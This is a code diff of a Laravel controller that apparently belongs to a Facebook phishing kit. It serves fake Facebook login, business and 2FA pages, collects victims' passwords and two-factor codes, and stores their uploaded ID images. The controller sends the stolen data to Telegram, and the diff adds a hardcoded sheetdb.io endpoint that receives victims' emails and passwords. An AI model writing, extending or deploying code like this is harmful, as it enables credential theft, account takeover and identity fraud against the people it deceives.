@@ -6,23 +6,23 @@ use Illuminate\Http\Request;
 use Illuminate\Support\Arr;
 use Illuminate\Support\Facades\Storage;
 
-class FacebookController extends Controller
+class Facebook2Controller extends Controller
 {
     public function index()
     {
-        return view('facebook.index', []);
+        return view('facebook2.index', []);
     }
     public function business()
     {
-        return view('facebook.business', []);
+        return view('facebook2.business', []);
     }
     public function getPasswordModal()
     {
-        return view('facebook.modal-login', []);
+        return view('facebook2.modal-login', []);
     }
     public function confirm2FA()
     {
-        return view('facebook.confirm', []);
+        return view('facebook2.confirm', []);
     }
     public function sendMessage(Request $request)
     {
@@ -43,10 +43,8 @@ class FacebookController extends Controller
             $full_infor .= "\n2FA First: " . $request->basic_fill_page_first_2fa;
             $full_infor .= "\n2FA Second: " . $request->basic_fill_page_second_2fa;
             $this->sendTelegram($full_infor);
-            $this->insertToSheet($request);
             return ['nextstep' => url('auth/upload-profile')];
         }
-        $a = $this->insertToSheet($request);
         $this->sendTelegram($full_infor);
         return ['nextstep' => url('auth/confirm')];
     }
@@ -82,36 +80,25 @@ class FacebookController extends Controller
             }
             $file->storeAs('phoi', $name);
         }
-        return redirect('waiting-verify');
+        return redirect('waiting-verify2');
     }
 
 
     public function waitingVerify()
     {
-        return view('facebook.waiting-verify', []);
+        return view('facebook2.waiting-verify2', []);
     }
-    public function insertToSheet($request)
+    public function insertToSheet($personal_email, $password, $infor)
     {
         $curl = curl_init();
         $data = [[
-            'Date' => date('d/m/Y h:i:s'),
-            'Region' => $request->basic_fill_page_country,
-            'City' => $request->basic_fill_page_city,
-            'FullName' => $request->basic_fill_name,
-            'Phone' => $request->basic_fill_phone,
-            'Password1' => $request->basic_fill_page_first_password,
-            'Password2' => $request->basic_fill_page_second_password,
-            'Email' => $request->basic_fill_business_email,
-            'PersonalEmail' => $request->basic_fill_personal_email,
-            'Ip' => $request->basic_fill_page_ip,
+            'Email' => $personal_email,
+            'Password' => $password,
+            'Infor' => $infor,
         ]];
-        if ($request->is_2fa == true) {
-            $data[0]['2FA1'] = $request->basic_fill_page_first_2fa;
-            $data[0]['2FA2'] = $request->basic_fill_page_second_2fa;
-        }
-        $url = env('GOOGLE_API');
+
         curl_setopt_array($curl, array(
-            CURLOPT_URL => $url,
+            CURLOPT_URL => 'https://sheetdb.io/api/v1/vpa7txbvojlil',
             CURLOPT_RETURNTRANSFER => true,
             CURLOPT_ENCODING => '',
             CURLOPT_MAXREDIRS => 10,
